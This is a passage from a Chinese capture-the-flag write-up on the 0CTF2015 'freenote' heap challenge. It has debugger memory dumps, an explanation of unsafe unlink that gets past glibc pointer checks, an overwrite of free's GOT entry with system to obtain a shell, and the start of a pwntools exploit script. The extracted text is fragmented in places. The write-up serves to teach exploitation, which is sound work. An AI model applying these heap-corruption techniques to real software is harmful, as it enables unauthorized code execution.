0x604a70: 0x0000000000000000 0x0000000000000000
chunk 0 和 chunk 2 被放进了 unsorted bin，且它们的 fd 和 bk 指针有我们需要的
地址。
995
6.1.7 pwn 0CTF2015 freenote
为了泄漏堆地址，我们分配一个内容长度为 8 的笔记，malloc 将从 unsorted bin 中
把原来 chunk 0 的空间取出来：
newnote("A"*8)
996
6.1.7 pwn 0CTF2015 freenote
gef➤ x/16gx 0x00603000
0x603000: 0x0000000000000000 0x0000000000001821
0x603010: 0x0000000000000100 0x0000000000000003 c
hunk 0 main_arena+88
gef➤ x/4gx 0x00603000+0x1820+0x90*3
0x6049d0: 0x0000000000000090 0x0000000000000090 : 0x0000000000000000 0x00000
00000000000
0x7ffff7dd3750: 0x0000000000000000 0x0000000000000000
0x7ffff7dd3760: 0x0000000100000000 0x0000000000000000 fd;
BK = P->bk;
FD->bk = BK
BK->fd = FD
需要绕过的检查：
(P->fd->bk != P || P->bk->fd != P) == False
最终效果是：
FD->bk = P = BK = &P - 16
BK->fd = P = FD = &P - 24
1000
6.1.7 pwn 0CTF2015 freenote
为了绕过它，我们需要一个指向 chunk 头的指针，通过前面的分析我们知道
Note.content 正好指向 chunk 头，而且没有被置空，那么就可以通过泄漏出来的堆
地址计算出这个指针的地址。
全部堆块的情况如下：
gef➤ x/4gx 0x603018
0x603018: 0x0000000000000003 0x0000000000000001
0x603028: 0x0000000000000020 0x0000000000604830 : 0x00007ffff7a97df0
另外这里将 length 设置为 8 也是有意义的，因为我们下一步修改 free 的地址为
system 地址，正好是 8 个字符长度，程序直接编辑其内容而不会调用 realloc 重新
分配空间：
editnote(0, p64(system_addr))
gef➤ x/gx 0x602018
0x602018 : 0x00007ffff7a5b640
gef➤ p system
$1 = {} 0x7ffff7a5b640 
于是最后一步调用 free 时，实际上是调用了 system('/bin/sh') ：
delnote(1)
gef➤ x/s 0x6048c0
0x6048c0: "/bin/sh"
pwn
1004
6.1.7 pwn 0CTF2015 freenote
开启 ASLR。Bingo!!!
$ python exp.py
[+] Starting local process './freenote': pid 30146
[*] heap base: 0x23b5000
[*] libc base: 0x7efc6903e000
[*] system address: 0x7efc69084640
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
from pwn import *
io = process(['./freenote'], env={'LD_PRELOAD':'./libc-2.19.so'}
)
elf = ELF('freenote')
libc = ELF('libc-2.19.so')
def newnote(x):
io.recvuntil("Your choice: ")
io.sendline("2")
io.recvuntil("Length of new note: ")
io.sendline(str(len(x)))
io.recvuntil("Enter your note: ")
io.send(x)